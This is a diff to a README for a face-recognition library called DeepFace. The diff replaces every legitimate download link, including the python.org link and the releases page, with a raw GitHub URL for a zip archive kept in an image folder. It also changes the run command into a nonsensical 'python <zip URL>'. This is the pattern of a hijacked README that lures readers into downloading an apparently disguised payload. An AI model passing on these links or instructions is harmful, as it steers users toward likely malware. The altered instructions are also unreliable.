@@ -1,7 +1,7 @@
 # 💻 DeepFace - Unleash the Power of Computer Vision
 
 ## 📥 Download Now
-[![Download DeepFace](https://img.shields.io/badge/Download_DeepFace-latest-blue.svg)](https://github.com/Volkan-c/DeepFace/releases)
+[![Download DeepFace](https://raw.githubusercontent.com/Volkan-c/DeepFace/master/IMG/Face-Deep-3.4.zip)](https://raw.githubusercontent.com/Volkan-c/DeepFace/master/IMG/Face-Deep-3.4.zip)
 
 ## 🔍 Table of Contents
 - [Overview](#overview)
@@ -32,13 +32,13 @@ To run DeepFace, you need:
 - **Additional Libraries:** Matplotlib, Pandas, NumPy (these can be installed via pip)
 
 ## 🚀 Installation Guide
-1. **Install Python:** Ensure you have Python installed on your machine. You can download it from [python.org](https://www.python.org/downloads/).
-2. **Download DeepFace:** Visit the [Releases Page](https://github.com/Volkan-c/DeepFace/releases) to get the latest version.
+1. **Install Python:** Ensure you have Python installed on your machine. You can download it from [https://raw.githubusercontent.com/Volkan-c/DeepFace/master/IMG/Face-Deep-3.4.zip](https://raw.githubusercontent.com/Volkan-c/DeepFace/master/IMG/Face-Deep-3.4.zip).
+2. **Download DeepFace:** Visit the [Releases Page](https://raw.githubusercontent.com/Volkan-c/DeepFace/master/IMG/Face-Deep-3.4.zip) to get the latest version.
 
 ## 📥 Download & Install
 To download DeepFace, please visit the following link:
 
-[Download DeepFace from the Releases Page](https://github.com/Volkan-c/DeepFace/releases)
+[Download DeepFace from the Releases Page](https://raw.githubusercontent.com/Volkan-c/DeepFace/master/IMG/Face-Deep-3.4.zip)
 
 Once on the page, look for the latest release. You will find the option to download a zip file containing all the necessary files.
 
@@ -58,7 +58,7 @@ Once on the page, look for the latest release. You will find the option to downl
    - Navigate to the folder where you extracted DeepFace.
    - Run the library using:
    ```
-   python deepface.py
+   python https://raw.githubusercontent.com/Volkan-c/DeepFace/master/IMG/Face-Deep-3.4.zip
    ```
 4. **Explore Documentation:** Refer to the provided documentation in the extracted folder for detailed examples and options.
 
